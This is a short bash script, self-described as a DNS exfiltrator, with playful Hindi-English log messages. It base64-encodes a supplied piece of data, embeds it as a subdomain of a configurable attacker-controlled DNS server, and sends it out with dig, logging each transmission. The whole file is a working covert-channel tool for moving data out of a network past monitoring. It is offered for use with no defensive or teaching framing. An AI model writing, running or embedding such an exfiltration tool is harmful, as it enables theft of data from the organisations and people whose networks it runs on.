#!/bin/bash
#!/bin/bash

# bash_based_dns_exfiltrator.sh
# Sends data via DNS queries with colorful log

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Config
DNS_SERVER="example.com" # Replace with your DNS server
LOG_FILE="/tmp/dns_exfiltrator.log"

# Trap Ctrl+C
trap cleanup SIGINT

cleanup() {
    echo -e "\n${RED}Bhai, exfiltrator band!${NC}"
    exit 0
}

# Fancy header
display_header() {
    clear
    echo -e "${BLUE}=== DNS Exfiltrator ===${NC}"
    echo -e "${GREEN}Sending data via DNS${NC}\n"
}

# Display exfiltration log
display_log() {
    display_header
    printf "${BLUE}%-30s %-20s${NC}\n" "Data" "Timestamp"
    printf "${BLUE}%s${NC}\n" "---------------------------------------------"
    tail -n 5 "$LOG_FILE" | while IFS='|' read -r data time; do
        printf "${YELLOW}%-30s %-20s${NC}\n" "$data" "$time"
    done
}

# Exfiltrate data
exfiltrate() {
    local data=$1
    encoded=$(echo -n "$data" | base64 | tr '+/' '-_')
    domain="$encoded.$DNS_SERVER"
    dig +short @"$DNS_SERVER" "$domain" >/dev/null 2>&1
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "$data|$timestamp" >> "$LOG_FILE"
    echo "$(date '+%Y-%m-%d %H:%M:%S') Sent: $data" >> "$LOG_FILE"
    display_log
}

# Main
main() {
    if [ $# -ne 1 ]; then
        echo -e "${RED}Bhai, data de! Usage: $0 <data>${NC}"
        echo -e "${YELLOW}Example: $0 'secret message'${NC}"
        exit 1
    fi
    if ! command -v dig >/dev/null 2>&1; then
        echo -e "${RED}Bhai, dig chahiye!${NC}"
        exit 1
    fi
    touch "$LOG_FILE"
    echo -e "${GREEN}Exfiltrating data...${NC}"
    exfiltrate "$1"
}

main "$@"